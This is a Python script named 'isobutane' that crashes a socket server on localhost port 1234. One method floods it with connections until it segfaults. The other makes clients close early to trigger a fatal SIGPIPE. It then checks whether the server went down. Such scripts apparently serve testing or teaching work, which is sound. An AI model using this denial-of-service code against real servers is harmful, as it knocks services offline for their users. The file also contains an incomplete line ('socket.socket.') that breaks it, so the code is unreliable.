import socket
from time import sleep


server = "localhost"
print("isobutane starting")
i = input("choose method: (alpha/beta) ")

def isobutane_alpha():
    # The player count is not limited in code so we can exploit that,
    # but stack overflow is not possible because some variable references the
    # inaccessible portion of memory first, causing a segmentation fault.

    counter = 0
    sockets = []
    while True:
        s = socket.socket()
        try:
            s.connect((server, 1234))
            s.send(("isobutane"+str(counter)+'\n').encode())
            sockets.append(s)
        except:
            print("isobutane-alpha appears to work correctly :D")
            break
        counter += 1
        socket.socket.

def isobutane_beta():
    # If a client quits before it receives a welcoming message,
    # a SIGPIPE occurs, and the server dies.

    sockets = []
    for i in range(5):
        s = socket.socket()
        sockets.append(s)
        s.connect((server, 1234))
        s.send(("isobutane"+str(i)+'\n').encode())
        s.shutdown(socket.SHUT_RD)



if i == "alpha":
    isobutane_alpha()
elif i == "beta":
    isobutane_beta()

sleep(0.5)

try:
    s = socket.socket()
    s.connect((server, 1234))
    print("isobutane did not work")
except:
    print("isobutane worked :D")
